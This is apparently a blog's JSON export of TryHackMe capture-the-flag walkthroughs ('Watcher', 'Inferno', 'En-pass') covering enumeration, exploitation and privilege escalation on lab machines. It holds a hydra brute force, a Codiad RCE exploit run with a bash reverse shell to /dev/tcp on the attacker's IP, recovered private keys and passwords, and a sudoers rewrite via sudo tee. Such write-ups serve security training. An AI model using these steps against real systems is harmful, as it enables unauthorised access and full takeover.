bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4 NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4 STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=   Use CyberChef to decode its content from base64 (based on the file extension and also because of padding with \u0026ldquo;=\u0026quot;).\n\nAfter decoding the content, we can see that it is a private key which we will use to successfully login as a root user and read the last flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  chmod 600 id_rsa ssh -i id_rsa root@10.10.217.134 root@watcher:~# id uid=0(root) gid=0(root) groups=0(root) root@watcher:~# ls -la total 40 drwx------ 6 root root 4096 Dec 3 02:32 . drwxr-xr-x 24 root root 4096 Dec 12 15:22 .. lrwxrwxrwx 1 root root 9 Dec 3 02:32 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwx------ 2 root root 4096 Dec 3 01:42 .cache -rw-r--r-- 1 root root 31 Dec 3 02:26 flag_7.txt drwx------ 3 root root 4096 Dec 3 01:42 .gnupg drwxr-xr-x 3 root root 4096 Dec 3 01:41 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw-r--r-- 1 root root 66 Dec 3 02:07 .selected_editor drwx------ 2 root root 4096 Dec 3 02:04 .ssh root@watcher:~# cat flag_7.txt | wc -c 31    Supporting article\nhttps://explainshell.com/explain?cmd=ssh%20-i%20keyfile%20host\n \rThank you for reading this blog post.\n","description":"A boot2root Linux machine utilizing web exploits along with some common privilege escalation techniques.","id":15,"section":"posts","tags":["enumeration","brute force","decoding","lfi","cron job","python","privilege escalation"],"title":"Watcher [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/watcher/"},{"content":"   Title  Inferno     Info  Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing   Difficulty  Medium   Date 2021/02/16    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.241.114\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  nmap -v -A -T4 10.10.241.114 Nmap scan report for 10.10.241.114 Host is up (0.10s latency). Not shown: 958 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp? 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d7:ec:1a:7f:62:74:da:29:64:b3:ce:1e:e2:68:04:f7 (RSA) | 256 de:4f:ee:fa:86:2e:fb:bd:4c:dc:f9:67:73:02:84:34 (ECDSA) |_ 256 e2:6d:8d:e1:a8:d0:bd:97:cb:9a:bc:03:c3:f8:d8:85 (ED25519) 23/tcp open telnet? 25/tcp open smtp? |_smtp-commands: Couldn\u0026#39;t establish connection on port 25 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Dante\u0026#39;s Inferno 88/tcp open kerberos-sec? 106/tcp open pop3pw? 110/tcp open pop3? 389/tcp open ldap? 443/tcp open https? 464/tcp open kpasswd5? 636/tcp open ldapssl? 777/tcp open multiling-http? 783/tcp open spamassassin? 808/tcp open ccproxy-http? 873/tcp open rsync? 1001/tcp open webpush? 1236/tcp open bvcontrol? 1300/tcp open h323hostcallsc? 2000/tcp open cisco-sccp? 2003/tcp open finger? |_finger: ERROR: Script execution failed (use -d to debug) 2121/tcp open ccproxy-ftp? 2601/tcp open zebra? 2602/tcp open ripd? 2604/tcp open ospfd? 2605/tcp open bgpd? 2607/tcp open connection? 2608/tcp open wag-service? 4224/tcp open xtell? 5051/tcp open ida-agent? 5432/tcp open postgresql? 5555/tcp open freeciv? 5666/tcp open nrpe? 6346/tcp open gnutella? 6566/tcp open sane-port? 6667/tcp open irc? |_irc-info: Unable to open connection 8021/tcp open ftp-proxy? 8081/tcp open blackice-icecap? 8088/tcp open radan-http? 9418/tcp open git? 10000/tcp open snet-sensor-mgmt? 10082/tcp open amandaidx? No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   Analyzing the output we will find that only two ports are legitimate, 22 (ssh) and 80 (http).\nBecause we don’t have ssh credentials yet, let\u0026rsquo;s visit port 80 in our browser.\n\nWe are welcome with Map of Hell by Botticelli inspired by Dante\u0026rsquo;s Divine Comedy.\nNothing interesting can be found in the page source.\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  gobuster dir -e -u http://10.10.241.114 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.241.114 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: bak,old,js,php,txt,html [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/16 13:23:36 Starting gobuster =============================================================== /index.html (Status: 200) /inferno (Status: 401) /server-status (Status: 403)   Navigating to /inferno we are prompted to authenticate.\n\nService Brute-Forcing We will try to brute force authentication with hydra and custom user list consisting of following usernames:\n admin\nadministrator\nroot\ndante\ninferno\n 1 2 3 4 5 6 7  hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.241.114 -m /inferno http-get [DATA] max 16 tasks per 1 server, overall 16 tasks, 71721995 login tries (l:5/p:14344399), ~4482625 tries per task [DATA] attacking http-get://10.10.241.114:80/inferno [STATUS] 1745.00 tries/min, 1745 tries in 00:01h, 71720250 to do in 685:01h, 16 active [STATUS] 2242.00 tries/min, 6726 tries in 00:03h, 71715269 to do in 533:08h, 16 active [80][http-get] host: 10.10.241.114 login: admin password: [REDACTED]   After few minutes valid set of credentials is found.\nGaining Access Using obtained password along with username for required authentication redirects us to another login form, where we will once again use the same credentials.\n\nWe are successfully in!\n\nExploitation Searching for Codiad we will find that it is a web-based IDE framework. Proceed with searching for \u0026ldquo;codiad exploit\u0026rdquo;. We found Github repository with RCE (Remote Code Execute) Exploit for Codiad. This exploit let us execute system command on Codiad to get a reverse shell. Clone this repository with git clone https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit.git and follow the instructions.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  python exploit.py http://10.10.241.114/inferno/ admin [REDACTED] 10.9.149.180 1234 linux [+] Please execute the following command on your vps: echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.149.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234 nc -lnvp 1235 [+] Please confirm that you have done the two command above [y/n] [Y/n] y [+] Starting... [+] Login Content : \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Unauthorized\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\u0026#39;t understand how to supply the credentials required.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.29 (Ubuntu) Server at 10.10.241.114 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; [-] Login failed! Please check your username and password.   We failed because we have to authenticate two times.\nModify the exploit command with the following parameters:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  python exploit.py http://admin:[REDACTED]@10.10.241.114/inferno/ admin [REDACTED] 10.9.140.180 1234 linux [+] Please execute the following command on your vps: echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.140.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234 nc -lnvp 1235 [+] Please confirm that you have done the two command above [y/n] [Y/n] y [+] Starting... [+] Login Content : {\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}} [+] Login success! [+] Getting writeable path... [+] Path Content : {\u0026#34;status\u0026#34;:\u0026#34;success\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;inferno\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;\\/var\\/www\\/html\\/inferno\u0026#34;}} [+] Writeable Path : /var/www/html/inferno [+] Sending payload... {\u0026#34;status\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;No Results Returned\u0026#34;} [+] Exploit finished! [+] Enjoy your reverse shell!   Do not forget to run the two provided commands in the separate terminals.\n1  echo \u0026#39;bash -c \u0026#34;bash -i \u0026gt;/dev/tcp/10.9.140.180/1235 0\u0026gt;\u0026amp;1 2\u0026gt;\u0026amp;1\u0026#34;\u0026#39; | nc -lnvp 1234   1 2 3 4 5  nc -lnvp 1235 connect to [10.9.140.180] from (UNKNOWN) [10.10.241.114] 52036 bash: cannot set terminal process group (922): Inappropriate ioctl for device bash: no job control in this shell www-data@Inferno:/var/www/html/inferno/components/filemanager$ exit   Right after getting a reverse shell we are getting kicked out.\nWe can spawn /bin/sh in a hope of bypassing this (probably) security measure.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  id uid=33(www-data) gid=33(www-data) groups=33(www-data) whoami www-data pwd /var/www/html/inferno/components/filemanager ls -la total 100 drwxr-xr-x 3 root root 4096 Jan 11 15:22 . drwxr-xr-x 17 root root 4096 Jan 11 15:22 .. -rwxr-xr-x 1 root root 1831 Jan 11 15:22 class.dirzip.php -rwxr-xr-x 1 root root 22371 Jan 11 15:22 class.filemanager.php -rwxr-xr-x 1 root root 3480 Jan 11 15:22 context_menu.json -rwxr-xr-x 1 root root 2695 Jan 11 15:22 controller.php -rwxr-xr-x 1 root root 5501 Jan 11 15:22 dialog.php -rwxr-xr-x 1 root root 2092 Jan 11 15:22 dialog_upload.php -rwxr-xr-x 1 root root 3406 Jan 11 15:22 download.php -rwxr-xr-x 1 root root 34802 Jan 11 15:22 init.js drwxr-xr-x 2 root root 4096 Jan 11 15:22 upload_scripts   Navigating to home directory we will find that there is another user present on the system called dante.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  cd /home ls -la total 12 drwxr-xr-x 3 root root 4096 Jan 11 15:19 . drwxr-xr-x 24 root root 4096 Jan 11 14:57 .. drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 dante cd dante ls -la total 72 drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 . drwxr-xr-x 3 root root 4096 Jan 11 15:19 .. -rw------- 1 dante dante 106 Jan 11 15:27 .Xauthority lrwxrwxrwx 1 root root 9 Jan 11 15:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dante dante 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 dante dante 3771 Apr 4 2018 .bashrc drwx------ 2 dante dante 4096 Jan 11 15:25 .cache drwxr-x--- 3 dante dante 4096 Jan 11 15:46 .config drwx------ 4 dante dante 4096 Jan 11 15:46 .gnupg -rw-r--r-- 1 dante dante 807 Apr 4 2018 .profile -rw-r--r-- 1 dante dante 0 Jan 11 15:30 .sudo_as_admin_successful drwxr-xr-x 2 root root 4096 Jan 11 15:29 Desktop drwxr-xr-x 2 root root 4096 Jan 11 15:29 Documents drwxr-xr-x 2 root root 4096 Jan 11 15:29 Downloads drwxr-xr-x 2 root root 4096 Jan 11 15:22 Music drwxr-xr-x 2 root root 4096 Jan 11 15:22 Pictures drwxr-xr-x 2 root root 4096 Jan 11 15:22 Public drwxr-xr-x 2 root root 4096 Jan 11 15:22 Templates drwxr-xr-x 2 root root 4096 Jan 11 15:22 Videos -rw------- 1 dante dante 33 Jan 11 15:22 local.txt cat local.txt cat: local.txt: Permission denied   Proceeding with directory enumeration we will find interesting file in the Downlaods folder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  cd Documents\tls -la total 464 drwxr-xr-x 2 root root 4096 Jan 11 15:29 . drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .. -rwxr-xr-x 1 root root 35312 Jan 11 15:29 beatrice.doc -rwxr-xr-x 1 root root 63704 Jan 11 15:29 caronte.doc -rwxr-xr-x 1 root root 133792 Jan 11 15:29 centauro.doc -rwxr-xr-x 1 root root 88280 Jan 11 15:29 cerbero.doc -rwxr-xr-x 1 root root 137440 Jan 11 15:29 virgilio.doc cd .. cd Downloads ls -la total 4420 drwxr-xr-x 2 root root 4096 Jan 11 15:29 . drwxr-xr-x 13 dante dante 4096 Jan 11 15:46 .. -rw-r--r-- 1 root root 1511 Nov 3 11:52 .download.dat -rwxr-xr-x 1 root root 137440 Jan 11 15:29 CantoI.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoII.docx -rwxr-xr-x 1 root root 88280 Jan 11 15:29 CantoIII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoIV.docx -rwxr-xr-x 1 root root 133792 Jan 11 15:29 CantoIX.docx -rwxr-xr-x 1 root root 43224 Jan 11 15:22 CantoV.docx -rwxr-xr-x 1 root root 133792 Jan 11 15:29 CantoVI.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoVII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoX.docx -rwxr-xr-x 1 root root 121432 Jan 11 15:29 CantoXI.docx -rwxr-xr-x 1 root root 149080 Jan 11 15:22 CantoXII.docx -rwxr-xr-x 1 root root 216256 Jan 11 15:22 CantoXIII.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoXIV.docx -rwxr-xr-x 1 root root 141528 Jan 11 15:29 CantoXIX.docx -rwxr-xr-x 1 root root 88280 Jan 11 15:29 CantoXV.docx -rwxr-xr-x 1 root root 137440 Jan 11 15:29 CantoXVI.docx -rwxr-xr-x 1 root root 121432 Jan 11 15:29 CantoXVII.docx -rwxr-xr-x 1 root root 2351792 Jan 11 15:22 CantoXVIII.docx -rwxr-xr-x 1 root root 63704 Jan 11 15:29 CantoXX.docx   Found .download.dat file contains hexadecimal values which we will convert into ASCII characters.\n1 2  cat .download.dat c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a   \nScrolling down the converted output we will find the ssh credentials.\nUser Access In the home directory, we can grab the user flag called local.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ssh dante@10.10.241.114 dante@10.10.241.114\u0026#39;s password: Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue Feb 16 20:35:07 UTC 2021 System load: 0.0 Processes: 594 Usage of /: 42.0% of 8.79GB Users logged in: 0 Memory usage: 68% IP address for eth0: 10.10.241.114 Swap usage: 0% 39 packages can be updated. 0 updates are security updates. Last login: Tue Feb 16 20:34:47 2021 from 10.9.140.180 dante@Inferno:~$ cat local.txt | wc -c 33   Privilege Escalation Once again we are being kicked out so we will repeat our \u0026ldquo;bypass\u0026rdquo; by spawning sh followed by sudo -l .\n1 2 3 4 5 6 7  dante@Inferno:~$ /bin/sh $ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee   From the output we can see that we may run tee as root.\nAs per usual, we will visit GTFObins for more information on how to escalate our privileges with tee.\nWe will configure sudoers file to run any binary as root. Following with sudo bash -p we will escalate privileges to root and grab the flag called proof.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  $ id uid=1000(dante) gid=1000(dante) groups=1000(dante),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev) $ echo \u0026#34;ALL ALL=NOPASSWD: ALL\u0026#34; | sudo tee -a /etc/sudoers ALL ALL=NOPASSWD: ALL $ sudo -l Matching Defaults entries for dante on Inferno: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dante may run the following commands on Inferno: (root) NOPASSWD: /usr/bin/tee (root) NOPASSWD: ALL $ sudo bash -p root@Inferno:~# /bin/sh # id uid=0(root) gid=0(root) groups=0(root) # cd /root # ls -la total 32 drwx------ 5 root root 4096 Jan 11 15:45 . drwxr-xr-x 24 root root 4096 Jan 11 14:57 .. lrwxrwxrwx 1 root root 9 Jan 11 15:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc drwxr-x--- 3 root root 4096 Jan 11 15:45 .config drwxr-xr-x 3 root root 4096 Jan 11 15:30 .local -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -rw------- 1 root root 79 Jan 11 15:45 proof.txt drwx------ 2 root root 4096 Jan 11 15:19 .ssh # cat proof.txt | wc -c 79   \rThank you for reading this blog post.\n","description":"Real Life machine vs CTF. The machine is designed to be real-life and is perfect for newbies starting out in penetration testing","id":16,"section":"posts","tags":["enumeration","brute force","codiad","privilege escalation"],"title":"Inferno [TryHackMe]","uri":"https://martinkubecka.github.io/posts/thm/inferno/"},{"content":"   Title  En-pass     Info   Get what you can\u0026rsquo;t.   Difficulty   Medium   Date 2021/02/15    Scanning \u0026amp; Enumeration We are given a host with IP address 10.10.175.174\nNmap Let\u0026rsquo;s start by running a port scan on the host using nmap. The output of the scan can be seen below:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  nmap -v -A -T4 -p- 10.10.175.174 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8a:bf:6b:1e:93:71:7c:99:04:59:d3:8d:81:04:af:46 (RSA) | 256 40:fd:0c:fc:0b:a8:f5:2d:b1:2e:34:81:e5:c7:a5:91 (ECDSA) |_ 256 7b:39:97:f0:6c:8a:ba:38:5f:48:7b:cc:da:72:a8:44 (ED25519) 8001/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: En-Pass No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).   The website is running on the unusual port so we will note it down. There are three pictures posted and nothing interesting in the page source.\n\nDirectory Brute-Forcing 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  gobuster dir -e -u http://10.10.175.174:8001/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html,bak,old,js [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 11:30:30 Starting gobuster =============================================================== . . . http://10.10.175.174:8001/403.php (Status: 403) . . . http://10.10.175.174:8001/reg.php (Status: 200) . . . http://10.10.175.174:8001/web (Status: 301) http://10.10.175.174:8001/zip (Status: 301)   Two interesting files and two directories were revealed. We will start with 403.php\n1  http://10.10.175.174:8001/403.php   \nNext we will proceed with ** reg.php**\n1  http://10.10.175.174:8001/reg.php   \nIn the middle of the page there is located a text field where we can input any string. After pressing Submit button the page gives us reply which contains either \u0026ldquo;Try Try!!\u0026rdquo; or \u0026ldquo;Try Again!!\u0026rdquo;. Let\u0026rsquo;s analyze the source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  \u0026lt;?php if($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;){ $title = $_POST[\u0026#34;title\u0026#34;]; if (!preg_match(\u0026#39;/[a-zA-Z0-9]/i\u0026#39; , $title )){ $val = explode(\u0026#34;,\u0026#34;,$title); $sum = 0; for($i = 0 ; $i \u0026lt; 9; $i++){ if ( (strlen($val[0]) == 2) and (strlen($val[8]) == 3 )) { if ( $val[5] !=$val[8] and $val[3]!=$val[7] ) $sum = $sum+ (bool)$val[$i].\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } if ( ($sum) == 9 ){ echo $result;//do not worry you\u0026#39;ll get what you need.  echo \u0026#34; Congo You Got It !! Nice \u0026#34;; } else{ echo \u0026#34; Try Try!!\u0026#34;; } } else{ echo \u0026#34; Try Again!! \u0026#34;; } } ?\u0026gt;  To bypass the filter in the above code we must build a very specific string based on the conditions:\n lowercase and uppercase characters and numbers are not allowed input string is split by comma as the delimiter substrings needs to be certain length or different values based on their order based on all the conditions a sum value is calculated and compared with a value of 9  Following the provided points, we will create this string and then press the Submit button.\n !!,!,!,!,!,!,!!,!!!,!!!,!\n \n Nice. Password : cimihan_are_you_here?\n Going back to the /web directory found earlier and navigating to its location, we are informed that we don\u0026rsquo;t have permission to access this resource.\n\nBecause this is a directory, we will perform a brute-force attack again.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/ -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: old,js,php,txt,html,bak [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 11:43:17 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources (Status: 301)   Finding another directory, we don\u0026rsquo;t have permission to access this resource either.\nLet\u0026rsquo;s continue with directory brute-forcing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: bak,old,js,php,txt,html [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:04:03 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek (Status: 301)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources/infoseek -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources/infoseek [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: php,txt,html,bak,old,js [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:13:30 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek/configure (Status: 301)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  gobuster dir -e -u http://10.10.175.174:8001/web/resources/infoseek/configure -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.html,.bak,.old,.js =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.175.174:8001/web/resources/infoseek/configure [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: old,js,php,txt,html,bak [+] Expanded: true [+] Timeout: 10s =============================================================== 2021/02/15 12:19:55 Starting gobuster =============================================================== http://10.10.175.174:8001/web/resources/infoseek/configure/key   After not giving up and repeating the process over and over, we will find a private key.\n\nThe last directory /zip found during the initial brute force is just a rabbit hole.\n\nFuzzing From the host scan we know that on the port 22 SSH service is running. We found a private key, but we still don\u0026rsquo;t have a username. Another dictionary attack may be a possibility but before that, we will try fuzzing the found php pages starting with 403.php\nTo perform this task, we will need403fuzzer and Burp Suite with Intercept off. You can perform this task solely in the command line but we will take advantage of going through Responses with status code **200 ** in the Burp Suite.\n1  python3 403fuzzer.py -u http://10.10.175.174:8001/403.php --proxy http://localhost:8080   Based on the methodology mentioned above, we will find a response with a message which contains a username.\n1  http://10.10.175.174:8001/403.php/..;/   \nGaining Access During the directory brute-force phases, we obtained Encrypted Private key and a password. Now, we will need a private key to be able to use SSH. Using following command and found password as a phrase, we get a key stored in a id_rsa file.\n1 2 3  openssl rsa -in key -out id_rsa Enter pass phrase for key: writing RSA key   Use this private key to gain access to a user account and get the first flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ssh -i id_rsa imsau@10.10.175.174 $ whoami imsau $ id uid=1002(imsau) gid=1002(imsau) groups=1002(imsau) $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;; imsau@enpass:~$ ls -la total 32 drwxr-xr-x 4 imsau imsau 4096 Jan 31 19:01 . drwxr-xr-x 3 root root 4096 Jan 31 19:53 .. lrwxrwxrwx 1 root root 9 Jan 31 19:01 .bash_history -\u0026gt; /dev/null -r-------- 1 imsau imsau 220 Aug 31 2015 .bash_logout 